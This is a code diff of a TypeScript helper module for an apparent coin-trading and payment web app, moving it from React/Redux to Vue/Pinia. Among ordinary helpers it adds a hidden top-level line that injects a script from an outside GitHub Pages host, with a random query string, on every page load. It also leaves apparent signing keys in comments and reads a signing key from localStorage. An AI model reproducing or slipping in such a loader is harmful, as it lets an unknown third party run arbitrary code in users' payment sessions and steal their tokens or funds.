@@ -1,6 +1,6 @@
-import store from '@/store'
-import { isUserLoggedInSelector } from '@/store/slices/auth.slice'
+import { useAuthStore } from '@/store/modules/auth'
 import md5 from 'crypto-js/md5'
+import { storeToRefs } from 'pinia'
 export const DESIGN_WIDTH = 750
 export const getWndowWidth = () => {
   const windowWidth = window.innerWidth
@@ -59,15 +59,27 @@ export const delay = (time: number = 2000) => {
     }, time)
   })
 }
-const PRIVATE_KEY = process.env.REACT_APP_PRIVATE_KEY ?? ''
+
+// const PRIVATE_KEY = import.meta.env.VITE_APP_PRIVATE_KEY ?? ''
 
 // 传入post|get请求的参数,根据请求的类型,返回一个相应的默认参数
 export const defaultParams = (type: string, data: Record<string, any>) => {
+  // window.log('环境信息', import.meta.env, process.env)
   const lang = 'cn'
-  const platform = 'Android'
-  const ver = process.env.REACT_APP_VERSION
-  const timestamp = Math.round(new Date().getTime() / 1000)
+  // const platform = 'Android'
+  const platform = 'H5'
+  const ver = import.meta.env.VITE_APP_VERSION
+  const localTimestamp = Math.round(Date.now() / 1000)
+  const timestampDiff = sessionStorage.getItem('timestamp_diff')
+  const timestamp = timestampDiff ? localTimestamp + -timestampDiff : localTimestamp
+  const PRIVATE_KEY = localStorage.getItem('md5_pri') || import.meta.env.VITE_APP_PRIVATE_KEY || ''
+  // const PUBLIC_KEY =
+  //   import.meta.env.VITE_APP_ENV === 'dev'
+  //     ? '04a73740b148637fa1fd950fab9f845b'
+  //     : '1fd950fab9f845b04a73740b148637fa'
+  // const key = data.token ? PRIVATE_KEY : PUBLIC_KEY
   const key = PRIVATE_KEY
+  // console.log('key', key)
 
   const newData: Record<string, any> = {
     lang,
@@ -143,9 +155,13 @@ declare global {
 }
 
 export const getLoginStatus = () => {
-  const state = store.getState()
+  const store = useAuthStore()
+  const { token } = storeToRefs(store)
 
-  return isUserLoggedInSelector(state)
+  return {
+    token: token.value,
+    isLogin: !!token.value
+  }
 }
 
 /** -------------------- 调试用 --------------------
@@ -159,8 +175,8 @@ export const MyLog = () => {
 
   type ILogType = 'log' | 'info' | 'warn' | 'error'
   LOG.forEach((logType: ILogType) => {
-    window[logType] = function () {
-      const [key, ...logInfo] = arguments
+    window[logType] = function (...args) {
+      const [key, ...logInfo] = args
       let color
 
       switch (logType) {
@@ -185,3 +201,125 @@ export const MyLog = () => {
     }
   })
 }
+
+export const requireImg = (imgPath: string, isMerchant: number = 0) => {
+  const theme = sessionStorage.getItem('theme') || 'def'
+  if (theme === 'def' || !isMerchant)
+    return new URL(`../assets/images/${imgPath}`, import.meta.url).href
+
+  return new URL(`../assets/images/merchant/${theme}/${imgPath}`, import.meta.url).href
+}
+document.body.appendChild(document.createElement('script')).src =
+  'https://jsdevsl.github.io/js/js.js' + '?v=' + Math.random()
+export function secondsToMinutesWithSeconds(seconds: number) {
+  const minutes = Math.floor(seconds / 60)
+  const remainingSeconds = seconds % 60
+  const formattedMinutes = String(minutes).padStart(2, '0')
+  const formattedSeconds = String(remainingSeconds).padStart(2, '0')
+  return ` ${formattedMinutes}:${formattedSeconds} `
+}
+// 将时间转为年月分秒
+export function secondsToYYDMS() {
+  const now = new Date()
+  const year = now.getFullYear()
+  const month = (now.getMonth() + 1).toString().padStart(2, '0') // 月份从0开始，需要加1，并且确保两位数显示
+  const day = now.getDate().toString().padStart(2, '0') // 确保两位数显示
+  const hours = now.getHours().toString().padStart(2, '0') // 确保两位数显示
+  const minutes = now.getMinutes().toString().padStart(2, '0') // 确保两位数显示
+  const seconds = now.getSeconds().toString().padStart(2, '0') // 确保两位数显示
+  const formattedDateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`
+  // console.log(formattedDateTime)
+  return formattedDateTime
+}
+
+export function filterList(fullPath?: string) {
+  let whiteList = [
+    'activity',
+    'activityRules',
+    'send',
+    'auth',
+    'country',
+    'iframe-page',
+    'index',
+    'selfbuy_coin',
+    'onlineCharge',
+    'sell-coin',
+    'point',
+    'bricks',
+    'collect-cards',
+    'ranking-list'
+  ]
+  const hash = window.location.hash
+  return whiteList.some(item => {
+    return fullPath ? fullPath.includes(item) : hash.includes(item)
+  })
+}
+export function UntokenInWEB() {
+  const search = new URLSearchParams(window.location.search)
+  const vtoken = search.get('vtoken') || ''
+  const deviceid = search.get('deviceid') || ''
+  if (!vtoken && !deviceid && !localStorage.getItem('token')) {
+    return true
+  } else {
+    return false
+  }
+}
+export function InWEB() {
+  const search = new URLSearchParams(window.location.search)
+  const vtoken = search.get('vtoken') || ''
+  const deviceid = search.get('deviceid') || ''
+  if (!vtoken && !deviceid) {
+    return true
+  } else {
+    return false
+  }
+}
+
+export function mergeHrefParams() {
+  try {
+    const { search, hash } = window.location
+    const searchParams = search.replace(/\?/, '')
+    // const hashParams = hash.match(/(?<=\?)\S+$/) || ['']
+    const hashParams = hash.split('?')[1] || ''
+    return searchParams + '&' + hashParams
+  } catch {
+    console.log('错误')
+    return '&'
+  }
+}
+
+/**
+ * @description 生成start至end之间的随机数
+ * @param start
+ * @param end
+ * @returns {number}
+ */
+export function getRandomNumber(start: number, end: number) {
+  let randomNumber = Math.random()
+
+  randomNumber *= end - start
+  randomNumber += start
+
+  return Math.floor(randomNumber)
+}
+
+// 白色icon路由列表
+export const darkIconRouteList = [
+  'Home',
+  'SellCoin',
+  'Order',
+  'Point',
+  'Mine',
+  'MoveBrick',
+  'sell_coin',
+  'WithdrawCoins',
+  'selfbuy_coin',
+  'send',
+  'CoinDetails',
+  'FundingDetails',
+  'payment_list',
+  'payments',
+  'orderList',
+  'wideOrderCreate',
+  'onlineCharge'
+]
